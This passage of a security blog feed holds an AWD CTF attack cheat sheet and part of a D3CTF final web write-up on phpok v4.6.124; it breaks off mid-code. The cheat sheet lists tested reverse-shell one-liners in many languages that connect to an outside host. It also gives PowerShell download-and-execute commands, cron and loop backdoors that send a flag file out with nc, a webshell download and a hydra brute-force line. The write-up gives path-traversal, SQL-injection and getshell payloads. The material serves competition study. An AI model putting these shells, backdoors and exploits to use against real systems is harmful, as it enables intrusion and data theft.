&lt;h1 id=&quot;爬虫&quot;&gt;&lt;a href=&quot;#爬虫&quot; class=&quot;headerlink&quot; title=&quot;爬虫&quot;&gt;&lt;/a&gt;爬虫&lt;/h1&gt;</summary>
      
    
    
    
    <category term="编程" scheme="https://m09ic.top/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="python" scheme="https://m09ic.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>AWD MyCheatSheet</title>
    <link href="https://m09ic.top/posts/7923/"/>
    <id>https://m09ic.top/posts/7923/</id>
    <published>2020-01-23T11:00:05.000Z</published>
    <updated>2021-01-04T14:51:57.852Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前一次比赛中临时整理的,写给自己看.</p><a id="more"></a><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><h3 id="crunch-hydra"><a href="#crunch-hydra" class="headerlink" title="crunch + hydra"></a>crunch + hydra</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crunch 10 10 -t 201800%%% -o password.txt</span><br><span class="line">hydra -u root -p password.txt -l 192.168.9.0&#x2F;24</span><br></pre></td></tr></table></figure><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">ps -u ctf  <span class="comment"># 显示特定用户进程</span></span><br><span class="line"></span><br><span class="line">last -n 5 awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> <span class="comment"># 显示最近登录的5个账号</span></span><br><span class="line"></span><br><span class="line">cat /etc/passwd |awk -F <span class="string">&#x27;:&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> <span class="comment">#显示所有账户</span></span><br><span class="line"></span><br><span class="line">netstat -antulp | grep EST <span class="comment"># 查看所有链接</span></span><br><span class="line"></span><br><span class="line">lsof -i:3306 <span class="comment"># 查看端口号</span></span><br><span class="line"></span><br><span class="line">tar cvf www.tar /var/www/html <span class="comment"># 打包源码</span></span><br><span class="line"></span><br><span class="line">scp /tmp ctf@192.168.1.1:/var/www/html <span class="comment"># 下载源码</span></span><br><span class="line"></span><br><span class="line">mysqldump -u root -p ctf&gt;ctf.sql <span class="comment"># 备份数据库</span></span><br><span class="line"></span><br><span class="line">mysql -u root -p ctf&lt; ctf.sql <span class="comment">#恢复数据库</span></span><br><span class="line">或</span><br><span class="line"><span class="built_in">source</span> ctf.sql </span><br><span class="line"></span><br><span class="line">find . -name <span class="string">&quot;*.php&quot;</span> -perm 4777 <span class="comment"># 查找777权限的php文件</span></span><br><span class="line"></span><br><span class="line">find ./ -mtime 0 -name <span class="string">&quot;*.php&quot;</span> <span class="comment"># 查找24小时内修改过的php文件</span></span><br><span class="line"></span><br><span class="line">rm -rf `find /var/www/html -name .*.php` <span class="comment"># 删除目录下 .*.php的文件</span></span><br><span class="line">    </span><br><span class="line">chattr -R +i /var/www/html <span class="comment"># 锁定文件</span></span><br><span class="line">    </span><br><span class="line">tcpdump -s 0 -w ctf.pcap port 9999 <span class="comment"># 高权限tcpdump抓包</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">alias</span> curl=<span class="string">&quot;echo flag&#123;1a5d51c54515649463521&#125;&quot;</span> <span class="comment"># 别名,需要写到.bashrc</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">unalias</span> <span class="comment"># 取消别名</span></span><br></pre></td></tr></table></figure><h3 id="杀进程"><a href="#杀进程" class="headerlink" title="杀进程"></a>杀进程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kill [pid]</span><br><span class="line">killall [进程名]</span><br><span class="line">pkill [进程名]</span><br><span class="line">pkill -u [用户名] # 一次不行多几次,再猛的不死马都得死</span><br></pre></td></tr></table></figure><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><h4 id="系统自带反弹"><a href="#系统自带反弹" class="headerlink" title="系统自带反弹"></a>系统自带反弹</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 1.1.1.1 4444</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 1.1.1.1 4444 &gt;/tmp/f</span><br><span class="line">bash -c <span class="string">&#x27;bash -i &gt;/dev/tcp/1.1.1.1/4444 0&gt;&amp;1&#x27;</span></span><br><span class="line">zsh -c <span class="string">&#x27;zmodload zsh/net/tcp &amp;&amp; ztcp 1.1.1.1 4444 &amp;&amp; zsh &gt;&amp;$REPLY 2&gt;&amp;$REPLY 0&gt;&amp;$REPLY&#x27;</span></span><br><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:1.1.1.1:4444  </span><br><span class="line">awk <span class="string">&#x27;BEGIN&#123;s=&quot;/inet/tcp/0/1.1.1.1/4444&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="反弹-shell-1"><a href="#反弹-shell-1" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><h4 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 下载powercat</span><br><span class="line">powershell IEX (New-Object System.<span class="built_in">Net</span>.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;)</span><br><span class="line"># 反弹shell</span><br><span class="line">powercat -c <span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span> -p <span class="number">4444</span> -e <span class="built_in">cmd</span></span><br></pre></td></tr></table></figure><h4 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 下载Invoke-PowerShellTcp</span><br><span class="line">IEX (**New**-Object <span class="built_in">Net</span>.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/<span class="number">9</span>a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#x27;);</span><br><span class="line"># 反弹shell</span><br><span class="line">Invoke-PowerShellTcp -Reverse -IPAddress <span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span> -port <span class="number">4444</span></span><br></pre></td></tr></table></figure><h4 id="powershell自定义函数"><a href="#powershell自定义函数" class="headerlink" title="powershell自定义函数"></a>powershell自定义函数</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -c &quot;$client = New-Object <span class="built_in">Net</span>.Sockets.TCPClient(&#x27;<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>&#x27;,<span class="number">4444</span>);$stream = $client.GetStream();[byte[]]$bytes = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;while(($i = $stream.Read($bytes, <span class="number">0</span>, $bytes.Length)) -ne <span class="number">0</span>)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,<span class="number">0</span>, $i);$sendback = (iex $data <span class="number">2</span>&gt;&amp;<span class="number">1</span> | Out-String );$sendback2 = $sendback + &#x27;PS &#x27; + (pwd).<span class="built_in">Path</span> + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,<span class="number">0</span>,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br></pre></td></tr></table></figure><h4 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#linux</span><br><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>&quot;,<span class="number">4444</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.<span class="keyword">call</span>([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><span class="line">#windows</span><br><span class="line">python -c &quot;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#x27;<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>&#x27;, <span class="number">4444</span>)), [[[(s2p_thread.<span class="built_in">start</span>(), [[(p2s_thread.<span class="built_in">start</span>(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[<span class="number">0</span>](lambda: None)][<span class="number">2</span>])(__contextlib.nested(<span class="built_in">type</span>(&#x27;except&#x27;, (), &#123;&#x27;__enter__&#x27;: lambda self: None, &#x27;__exit__&#x27;: lambda __self, __exctype, __value, __traceback: __exctype is <span class="keyword">not</span> None and (issubclass(__exctype, KeyboardInterrupt) and [True <span class="keyword">for</span> __out[<span class="number">0</span>] <span class="keyword">in</span> [((s.close(), lambda after: after())[<span class="number">1</span>])]][<span class="number">0</span>])&#125;)(), <span class="built_in">type</span>(&#x27;try&#x27;, (), &#123;&#x27;__enter__&#x27;: lambda self: None, &#x27;__exit__&#x27;: lambda __self, __exctype, __value, __traceback: [False <span class="keyword">for</span> __out[<span class="number">0</span>] <span class="keyword">in</span> [((p.wait(), (lambda __after: __after()))[<span class="number">1</span>])]][<span class="number">0</span>]&#125;)())))([None]))[<span class="number">1</span>] <span class="keyword">for</span> p2s_thread.daemon <span class="keyword">in</span> [(True)]][<span class="number">0</span>] <span class="keyword">for</span> __g[&#x27;p2s_thread&#x27;] <span class="keyword">in</span> [(threading.Thread(target=p2s, args=[s, p]))]][<span class="number">0</span>])[<span class="number">1</span>] <span class="keyword">for</span> s2p_thread.daemon <span class="keyword">in</span> [(True)]][<span class="number">0</span>] <span class="keyword">for</span> __g[&#x27;s2p_thread&#x27;] <span class="keyword">in</span> [(threading.Thread(target=s2p, args=[s, p]))]][<span class="number">0</span>] <span class="keyword">for</span> __g[&#x27;p&#x27;] <span class="keyword">in</span> [(subprocess.Popen([&#x27;\\windows\\system32\\<span class="built_in">cmd</span>.exe&#x27;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][<span class="number">0</span>])[<span class="number">1</span>] <span class="keyword">for</span> __g[&#x27;s&#x27;] <span class="keyword">in</span> [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][<span class="number">0</span>] <span class="keyword">for</span> __g[&#x27;p2s&#x27;], p2s.__name__ <span class="keyword">in</span> [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#x27;s&#x27;].send(__l[&#x27;p&#x27;].stdout.read(<span class="number">1</span>)), __this())[<span class="number">1</span>] <span class="keyword">if</span> True <span class="keyword">else</span> __after())())(lambda: None) <span class="keyword">for</span> __l[&#x27;s&#x27;], __l[&#x27;p&#x27;] <span class="keyword">in</span> [(s, p)]][<span class="number">0</span>])(&#123;&#125;), &#x27;p2s&#x27;)]][<span class="number">0</span>] <span class="keyword">for</span> __g[&#x27;s2p&#x27;], s2p.__name__ <span class="keyword">in</span> [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#x27;p&#x27;].stdin.write(__l[&#x27;data&#x27;]), __after())[<span class="number">1</span>] <span class="keyword">if</span> (len(__l[&#x27;data&#x27;]) &gt; <span class="number">0</span>) <span class="keyword">else</span> __after())(lambda: __this()) <span class="keyword">for</span> __l[&#x27;data&#x27;] <span class="keyword">in</span> [(__l[&#x27;s&#x27;].recv(<span class="number">1024</span>))]][<span class="number">0</span>] <span class="keyword">if</span> True <span class="keyword">else</span> __after())())(lambda: None) <span class="keyword">for</span> __l[&#x27;s&#x27;], __l[&#x27;p&#x27;] <span class="keyword">in</span> [(s, p)]][<span class="number">0</span>])(&#123;&#125;), &#x27;s2p&#x27;)]][<span class="number">0</span>] <span class="keyword">for</span> __g[&#x27;os&#x27;] <span class="keyword">in</span> [(__import__(&#x27;os&#x27;, __g, __g))]][<span class="number">0</span>] <span class="keyword">for</span> __g[&#x27;socket&#x27;] <span class="keyword">in</span> [(__import__(&#x27;socket&#x27;, __g, __g))]][<span class="number">0</span>] <span class="keyword">for</span> __g[&#x27;subprocess&#x27;] <span class="keyword">in</span> [(__import__(&#x27;subprocess&#x27;, __g, __g))]][<span class="number">0</span>] <span class="keyword">for</span> __g[&#x27;threading&#x27;] <span class="keyword">in</span> [(__import__(&#x27;threading&#x27;, __g, __g))]][<span class="number">0</span>])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#x27;contextlib&#x27;))&quot;</span><br></pre></td></tr></table></figure><h4 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h4><p><em>(python3的只发现在msfvenom上有meterpreter版本的,没有普通的oneliner reverse shell,因此自己写了一个)</em></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;(lambda __g, __y: [[[[(sock.connect((&#x27;<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>&#x27;,<span class="number">4444</span>)), (lambda __after: __y(lambda __this: lambda: [[[[(sock.send(m_stdout), (<span class="built_in">time</span>.sleep(<span class="number">1</span>), __this())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">for</span> (__g[&#x27;m_stdout&#x27;], __g[&#x27;m_stderr&#x27;]) <span class="keyword">in</span> [(comRst.communicate())]][<span class="number">0</span>] <span class="keyword">for</span> __g[&#x27;comRst&#x27;] <span class="keyword">in</span> [(subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE))]][<span class="number">0</span>] <span class="keyword">for</span> __g[&#x27;data&#x27;] <span class="keyword">in</span> [(data.decode(&#x27;utf-<span class="number">8</span>&#x27;))]][<span class="number">0</span>] <span class="keyword">for</span> __g[&#x27;data&#x27;] <span class="keyword">in</span> [(sock.recv(<span class="number">1024</span>))]][<span class="number">0</span>] <span class="keyword">if</span> True <span class="keyword">else</span> __after())())(lambda: None))[<span class="number">1</span>] <span class="keyword">for</span> __g[&#x27;sock&#x27;] <span class="keyword">in</span> [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][<span class="number">0</span>] <span class="keyword">for</span> __g[&#x27;socket&#x27;] <span class="keyword">in</span> [(__import__(&#x27;socket&#x27;, __g, __g))]][<span class="number">0</span>] <span class="keyword">for</span> __g[&#x27;subprocess&#x27;] <span class="keyword">in</span> [(__import__(&#x27;subprocess&#x27;, __g, __g))]][<span class="number">0</span>] <span class="keyword">for</span> __g[&#x27;<span class="built_in">time</span>&#x27;] <span class="keyword">in</span> [(__import__(&#x27;<span class="built_in">time</span>&#x27;, __g, __g))]][<span class="number">0</span>])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))))&quot;</span><br></pre></td></tr></table></figure><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;1.1.1.1&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;1.1.1.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure><h4 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> linux</span></span><br><span class="line">ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;1.1.1.1&quot;,4444).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash"> windows</span></span><br><span class="line">ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;1.1.1.1&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)io|c.print io.readend&#x27;</span><br></pre></td></tr></table></figure><h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><p>保存到jar文件,运行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Revs</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> Exception </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/1.1.1.1/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>),</span><br><span class="line">    cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>),</span><br><span class="line">    sh = cp.spawn(<span class="string">&quot;/bin/sh&quot;</span>, []);</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">    client.connect(<span class="number">4444</span>, <span class="string">&quot;1.1.1.1&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/a/</span>;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>以上命令均测试过有效,使用请自行修改ip和port.</p><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><h4 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h4><p><code>echo &#39;*/1 * * * * nc -w 1 1.1.1.1 4444 &lt; /flag&#39; &gt; initflag.cron</code> </p><p><code>crontab initflag.cron</code></p><h4 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h4><p><code>echo  &#39;while true\ndo\nnc -w 1 1.1.1.1 4444 &lt; /flag &gt;&amp;1\nsleep 1m\ndone&#39;&gt; web_init.sh</code></p><p><code>sh web_init.sh</code></p><h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><p><code>curl http://1.1.1.1/LongLiveAlkaid.txt -o .function.inc.php</code></p><p>webshell pass:<br>get:url?pass=LongLiveAlkaid<br>post:a</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://klionsec.github.io/2016/09/27/revese-shell/">https://klionsec.github.io/2016/09/27/revese-shell/</a></p><p>[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md]">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources/Reverse Shell Cheatsheet.md)</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;之前一次比赛中临时整理的,写给自己看.&lt;/p&gt;</summary>
    
    
    
    
    <category term="学习笔记" scheme="https://m09ic.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>D3CTF FINAL Writeup(WEB)</title>
    <link href="https://m09ic.top/posts/10013/"/>
    <id>https://m09ic.top/posts/10013/</id>
    <published>2020-01-23T10:43:25.000Z</published>
    <updated>2021-01-04T14:52:14.629Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>抱歉来晚了,赛后写完就丢在草稿箱里忘了发.</p><p>技术部分实际上比较常见,稍微写下水篇博客.</p><p>源码链接:可能有部分代码已被修改,可以参考文章看原本的漏洞位置.</p><p><a href="https://share.weiyun.com/57BvkJk">https://share.weiyun.com/57BvkJk</a></p><a id="more"></a><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>cms: phpok v4.6.124</p><p>写的顺序就按照我们挨打的顺序来了.</p><h3 id="任意文件读"><a href="#任意文件读" class="headerlink" title="任意文件读"></a>任意文件读</h3><p>最初看到的流量是后台的任意文件读,稍微看了下代码.</p><p>后台弱口令admin:admin123</p><p>漏洞位于:<code>\phpok\\framework\admin\admin_control.php:129行</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$title</span> = <span class="keyword">$this</span>-&gt;get(<span class="string">&quot;title&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">$this</span>-&gt;dir_root . <span class="variable">$folder</span> . <span class="variable">$title</span>;</span><br></pre></td></tr></table></figure><p>没有过滤直接拼接,因此可以目录穿越读到flag.</p><p>payload:</p><p><code>/admin.php?c=appsys&amp;f=file_edit&amp;id=fav&amp;title=../../../../../../../flag</code></p><p>比赛的时候比较着急,只看到挨打后顺着流量摸了这个文件,没去仔细审计.赛后稍微看了下,类似的操作不止可以读文件.在写文件,解压文件都以同样的方式拼接字符串.而且在index与api入口,也存在类似拼接.因此前台即可读文件.</p><p>api处payload: <code>api.php?c=download&amp;file=res/201903/27/../../../../../../../flag</code></p><p>index处payload: <code>c=download&amp;file=res/201903/27/../../../../../../../flag</code></p><p>修复则是在入口处简单过滤了<code>..</code></p><h3 id="前台getshell"><a href="#前台getshell" class="headerlink" title="前台getshell"></a>前台getshell</h3><p>详情见文章:<a href="https://www.anquanke.com/post/id/194453">https://www.anquanke.com/post/id/194453</a></p><p>巧的是发这文章的师傅也是这次比赛的选手.</p><p>又是挨打后找到流量,</p><p><code>/api.php?c=call&amp;f=index&amp;data=&#123;&quot;m_picplayer&quot;:&#123;&quot;site&quot;:1,&quot;type_id&quot;:&quot;sql&quot;,&quot;sqlinfo&quot;:&quot;update app.d3ctf_list_40 set content=(select 1) where id = 1756&quot;&#125;&#125;&quot;</code></p><p>也可使用反序列化后getshell,但大佬们似乎为了快速获得flag,只将flag弄到了前台,并没有维持权限与getshell.所以这虽然是你审计的0day,但是下一秒是我的了.</p><p>大概有两三只队伍到游戏结束也没修复.</p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>同样位于api接口,没有直接的回显,可以盲注.</p><p>payload:<code>api.php?c=project&amp;f=index&amp;token=q&amp;id=news&amp;sort=IF(ascii(substr((select flag from ctf.flag),%s,1))=%s,1,(select 1 from information_schema.tables))</code></p><p>简单追踪一下漏洞位置:</p><p><code>phpok/frameword/api/project_control.php:190-194</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$sort</span>) &#123;</span><br><span class="line">    <span class="variable">$dt</span>[<span class="string">&#x27;orderby&#x27;</span>] = <span class="variable">$sort</span>;</span><br><span class="line">    <span class="variable">$pageurl</span> .= <span class="string">&#x27;&amp;sort=&#x27;</span> . rawurlencode(<span class="variable">$sort</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;rlist[<span class="string">&#x27;sort&#x27;</span>] = <span class="variable">$sort</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sort参数被赋值到<code>$dt[&#39;orderby&#39;]</code></p><p>在212行:<code>$info = $this-&gt;call-&gt;phpok(&#39;_arclist&#39;, $dt);</code></p><p>跟进<code>phpok/frameword.</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$orderby</span> = <span class="variable">$rs</span>[<span class="string">&#x27;orderby&#x27;</span>] ? <span class="variable">$rs</span>[<span class="string">&#x27;orderby&#x27;</span>] : <span class="variable">$project</span>[<span class="string">&#x27;orderby&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$rs</span>[<span class="string">&#x27;is_list&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$rs</span>[<span class="string">&#x27;psize&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$offset</span> = <span class="variable">$rs</span>[<span class="string">&#x27;offset&#x27;</span>] ? intval(<span class="variable">$rs</span>[<span class="string">&#x27;offset&#x27;</span>]) : <span class="number">0</span>;</span><br><span class="line"><span class="variable">$psize</span> = <span class="variable">$rs</span>[<span class="string">&#x27;is_list&#x27;</span>] ? intval(<span class="variable">$rs</span>[<span class="string">&#x27;psize&#x27;</span>]) : <span class="number">1</span>;</span><br><span class="line"><span class="variable">$rslist</span> = <span class="keyword">$this</span>-&gt;model(<span class="string">&#x27;list&#x27;</span>)-&gt;arc_all(<span class="variable">$project</span>, <span class="variable">$condition</span>, <span class="variable">$field</span>, <span class="variable">$offset</span>, <span class="variable">$psize</span>, <span 